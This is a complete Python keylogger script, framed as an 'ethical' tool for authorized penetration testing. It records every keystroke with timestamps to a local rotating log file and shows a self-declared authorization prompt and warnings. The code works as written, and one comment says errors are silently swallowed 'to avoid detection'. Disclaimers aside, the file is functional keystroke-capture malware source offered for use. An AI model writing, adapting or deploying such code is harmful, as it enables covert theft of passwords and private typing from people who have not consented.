#!/usr/bin/env python3
"""
Ethical Keylogger for Authorized Security Testing
ONLY FOR PENETRATION TESTING WITH EXPLICIT PERMISSION

This keylogger is designed for security assessments and should only be used:
1. On systems where you have explicit written authorization
2. For vulnerability assessments and security research
3. In controlled environments with proper legal agreements
"""

import os
import sys
import time
import threading
from datetime import datetime
from pynput import keyboard
import argparse
import signal

class EthicalKeylogger:
    def __init__(self, log_file="keylog.txt", max_size=1024*1024):
        """
        Initialize the keylogger
        
        Args:
            log_file (str): Path to the log file
            max_size (int): Maximum log file size in bytes (default 1MB)
        """
        self.log_file = log_file
        self.max_size = max_size
        self.log_data = []
        self.lock = threading.Lock()
        self.listener = None
        self.running = False
        
        # Create log file if it doesn't exist
        if not os.path.exists(self.log_file):
            with open(self.log_file, "w") as f:
                f.write(f"[Ethical Keylogger Started: {datetime.now()}]\n")
                f.write("[FOR AUTHORIZED SECURITY TESTING ONLY]\n\n")
    
    def on_press(self, key):
        """Handle key press events"""
        if not self.running:
            return False
            
        try:
            # Format the key press
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # Handle special keys
            if hasattr(key, 'char') and key.char:
                # Regular character key
                entry = f"[{timestamp}] {key.char}"
            else:
                # Special keys (Ctrl, Alt, etc.)
                entry = f"[{timestamp}] [{key}]"
                
            # Add to log buffer
            with self.lock:
                self.log_data.append(entry)
                
            # Check if we need to flush the buffer
            if len(self.log_data) >= 10:  # Flush every 10 keystrokes
                self.flush_log()
                
        except Exception as e:
            # Silently handle exceptions to avoid detection
            pass
    
    def on_release(self, key):
        """Handle key release events"""
        # Stop keylogger on Esc key press
        if key == keyboard.Key.esc:
            return False
    
    def flush_log(self):
        """Write buffered log data to file"""
        try:
            with self.lock:
                if self.log_data:
                    # Check file size and rotate if needed
                    if os.path.exists(self.log_file) and os.path.getsize(self.log_file) > self.max_size:
                        self.rotate_log()
                    
                    # Write to file
                    with open(self.log_file, "a") as f:
                        for entry in self.log_data:
                            f.write(entry + "\n")
                    self.log_data.clear()
        except Exception as e:
            # Silently handle exceptions
            pass
    
    def rotate_log(self):
        """Rotate log file when it exceeds max size"""
        try:
            # Close current file
            if os.path.exists(self.log_file):
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                backup_name = f"{self.log_file}.{timestamp}"
                os.rename(self.log_file, backup_name)
                
                # Create new log file with header
                with open(self.log_file, "w") as f:
                    f.write(f"[Ethical Keylogger Started: {datetime.now()}]\n")
                    f.write("[FOR AUTHORIZED SECURITY TESTING ONLY]\n\n")
        except Exception as e:
            pass
    
    def start(self):
        """Start the keylogger"""
        print("Ethical Keylogger Starting...")
        print("Press ESC to stop...")
        print("=" * 40)
        
        self.running = True
        
        # Start keyboard listener
        with keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release) as listener:
            
            self.listener = listener
            listener.join()
        
        # Flush any remaining data
        self.flush_log()
        self.running = False
        print("\nKeylogger stopped.")
    
    def stop(self):
        """Stop the keylogger"""
        self.running = False
        if self.listener:
            self.listener.stop()
        self.flush_log()

def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully"""
    print("\nReceived interrupt signal. Stopping keylogger...")
    sys.exit(0)

def main():
    parser = argparse.ArgumentParser(description="Ethical Keylogger for Security Testing")
    parser.add_argument("-o", "--output", help="Output file path", default="keylog.txt")
    parser.add_argument("-s", "--size", help="Max log file size in MB", type=int, default=1)
    
    args = parser.parse_args()
    
    # Set up signal handler for graceful exit
    signal.signal(signal.SIGINT, signal_handler)
    
    # Display warning
    print("!" * 60)
    print("ETHICAL KEYLOGGER - AUTHORIZED SECURITY TESTING ONLY")
    print("!" * 60)
    print("Ensure you have explicit permission before using this tool.")
    print("Unauthorized use is illegal and unethical.")
    print("Press Ctrl+C to exit at any time.")
    print("Press ESC key to stop logging.")
    print("!" * 60)
    
    # Confirm usage
    confirm = input("\nDo you have explicit authorization to run this on this system? (yes/no): ")
    if confirm.lower() not in ['yes', 'y']:
        print("Keylogger not started. Authorization required.")
        return
    
    # Create keylogger instance
    max_bytes = args.size * 1024 * 1024  # Convert MB to bytes
    keylogger = EthicalKeylogger(log_file=args.output, max_size=max_bytes)
    
    try:
        # Start keylogger
        keylogger.start()
    except KeyboardInterrupt:
        print("\nKeylogger interrupted.")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        keylogger.stop()

if __name__ == "__main__":
    # Check if running as script
    if len(sys.argv) == 1:
        print("Ethical Keylogger - For authorized security testing only")
        print("Usage: python keylogger.py -o output_file.txt")
        print("       Press ESC to stop logging")
        print("       Press Ctrl+C to exit")
    
    # Check for required module
    try:
        import pynput
    except ImportError:
        print("Error: pynput module not found.")
        print("Install it with: pip install pynput")
        sys.exit(1)
    
    main()
